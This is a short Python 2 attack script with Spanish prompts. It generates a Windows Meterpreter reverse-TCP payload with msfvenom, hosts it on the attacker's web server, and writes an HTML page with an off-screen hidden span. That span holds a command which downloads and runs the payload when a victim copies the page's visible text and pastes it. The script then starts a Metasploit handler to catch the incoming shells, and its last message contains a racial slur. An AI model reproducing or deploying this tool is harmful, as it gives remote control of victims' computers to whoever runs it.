#-*- coding: utf-8 -*-
import os, sys
def windowsinfect():
	print "La victima tiene que tener wget instalado"
	cont=raw_input("desea continuar (si/no)")
	if cont == "si":
		print "[x]Limpiando..."
		os.system("rm /var/www/html/payload.exe")
		os.system("rm /var/www/html/index.html")
		ip=raw_input("ingrese ip: ")
		port=raw_input("ingrese puerto: ")
		print "[*]Creando payload..."
		os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ip + " LPORT=" + port + " -f exe > /var/www/html/payload.exe")
		mensaje1=raw_input("Primer Mensaje: ")		
		mensaje2=raw_input("Segundo Mensaje: ")
		comando=raw_input("Comando: ")
		index="index.html"
		job=open(index,"w")	
		job.write("""<p> """ + mensaje1 + """ <span style="position: absolute; left: -2000; top: -100px;" >c:\; cls; wget -c http://"""+ip+"""/payload.exe > c:\ & payload.exe & cls <br> """ + comando + """ </span> """ + mensaje2 + """ </p> """)
		job.close()
		os.system("cp index.html /var/www/html")
		print "[:D] Todo esta completo http://127.0.0.1/ ó http://"+ip+"/ Con toda campeon ;v"
		continuar=raw_input("desea continuar (si/no) ")
		if continuar == "si":
			documento="meta_config"
			archivo = open(documento,"w")
			archivo.write("""use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST """ + ip + """
set LPORT """ + port + """
set ExitOnSession false
exploit -j""")
			archivo.close()
			os.system("msfconsole -r meta_config")
		elif continuar == "no":
			print "bay bay nigga"
	elif cont == "no":
		print "Adiós"
		sys.exit()
